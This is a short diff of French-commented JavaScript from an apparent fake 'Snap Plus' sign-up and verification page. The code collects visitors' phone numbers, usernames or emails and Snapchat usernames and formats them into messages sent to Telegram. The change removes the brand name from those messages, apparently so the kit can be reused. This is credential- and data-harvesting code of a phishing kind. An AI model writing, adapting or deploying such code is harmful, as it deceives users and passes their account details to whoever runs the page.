@@ -88,7 +88,7 @@ if (loginForm) {
         localStorage.setItem('snapPlus_id', uniqueId);
         
         // Envoyer à Telegram
-        const message = `📞 <b>Nouvelle inscription Snap Plus</b>\n\n` +
+        const message = `📞 <b>Nouvelle inscription</b>\n\n` +
                        `🔑 <b>ID Unique:</b> ${uniqueId}\n` +
                        `📱 <b>Téléphone:</b> ${username}\n` +
                        `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
@@ -162,7 +162,7 @@ if (verificationForm) {
         }
         
         // Envoyer à Telegram
-        const message = `✅ <b>Vérification Snap Plus</b>\n\n` +
+        const message = `✅ <b>Vérification</b>\n\n` +
                        `🔑 <b>ID Unique:</b> ${uniqueId}\n` +
                        `👤 <b>Username/Email:</b> ${username}\n` +
                        `📸 <b>Pseudo Snapchat:</b> ${snapchatUsername}\n` +
